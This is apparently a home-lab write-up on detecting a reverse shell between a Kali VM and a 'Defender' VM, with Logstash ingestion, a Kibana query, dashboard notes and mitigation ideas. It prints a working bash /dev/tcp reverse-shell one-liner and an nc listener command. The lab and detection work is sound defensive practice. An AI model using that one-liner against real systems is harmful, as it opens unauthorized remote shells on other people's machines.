# Reverse Shell Detection (Kali → Defender)

## 🧨 Attack Summary
Simulated a reverse shell from Kali to Defender VM using Bash TCP syntax:
bash -c 'bash -i >& /dev/tcp/<defender ip>/4444 0>&1'
- Target: Defender VM on port 4444
- Attacker: Kali 
- Listener started with `nc -lvnp 4444` on Defender
- Reverse connection confirmed—shell established

## 📥 Log Ingestion
Manually injected detection log into Logstash via TCP:
echo "[REVSHELL]: Kali connected to Defender on port 4444" | nc <defender ip> 5000

Pipeline tagged these events with `recon`, `rev_shell`, and `Kali` metadata.

## 🔍 Kibana Query
Detect reverse shell events with:
message: "[REVSHELL]*"

## 📊 Dashboard Integration
- Added bar graph for `[REVSHELL]` events over time
- Created tag-based breakdown of recon vs shell payloads

## 🛡️ Mitigation Ideas
- Alert on use of port 4444 or other uncommon shell ports
- Monitor for bash session spawns from external IPs
- Implement firewall rules to restrict reverse shell behavior
- Add tagging logic in pipeline to auto-flag shell activity

